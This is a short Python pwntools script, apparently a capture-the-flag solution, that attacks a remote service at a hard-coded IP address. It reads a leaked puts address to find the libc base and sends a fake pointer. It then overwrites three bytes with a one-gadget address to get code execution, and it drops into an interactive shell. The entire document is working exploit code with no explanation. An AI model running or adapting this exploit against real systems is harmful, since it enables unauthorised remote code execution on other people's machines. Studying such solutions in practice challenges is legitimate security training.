from pwn import*
from LD import*
p = remote('39.97.210.182',10055)
#p = remote('node3.buuoj.cn',25519)
libc = ELF('./libc-2.27.so',checksec=False)
p.recvuntil('near: ')
libc_base = int(p.recv(14),16) - libc.sym['puts']
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('shoot!shoot!\n')
fake = libc_base + 0x81DF68 - 8
p.sendline(str(fake))
rce = libc_base + 0x10A38C - 5
off = [rce&0xFF,(rce>>8)&0xFF,(rce>>16)&0xFF]
log.info('RCE:\t' + hex(rce))
for i in range(3):
	p.sendline(p8(off[i]))
p.interactive()
